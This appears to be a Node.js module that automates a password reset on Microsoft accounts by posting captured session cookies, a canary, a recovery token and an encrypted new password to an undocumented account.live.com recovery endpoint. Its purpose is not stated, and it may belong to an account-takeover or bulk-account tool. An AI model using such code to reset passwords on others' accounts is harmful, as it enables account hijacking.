const axios = require("axios");
const { queryParams } = require("../../../db/db");
const Encrypt = require("./encryptOtt2");

module.exports = async (amrp, amsc, apicanary, epid, signinName, passwordToken, password) => {
 let data = await axios({
  method: "POST",
  url: "https://account.live.com/API/Recovery/ResetPassword",
  headers: {
   Cookie: `AMRPSSecAuth=${amrp}; amsc=${amsc}; `,
   canary: apicanary,
  },
  data: {
   encryptedPwd: Encrypt(``, ``, `newpwd`, password),
   epid: epid,
   expiryEnabled: null,
   hpgid: 200292,
   needsSlt: 0,
   publicKey: "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12",
   scid: 100103,
   signinName: signinName,
   tfaEpid: null,
   token: passwordToken,
   uaid: "071485d2de8c4869ba48cf2a64fd52cc",
   uiflvr: 1001,
  },
 });
 if (data?.data?.error) {
  return false
 } else {
  return true
 }
}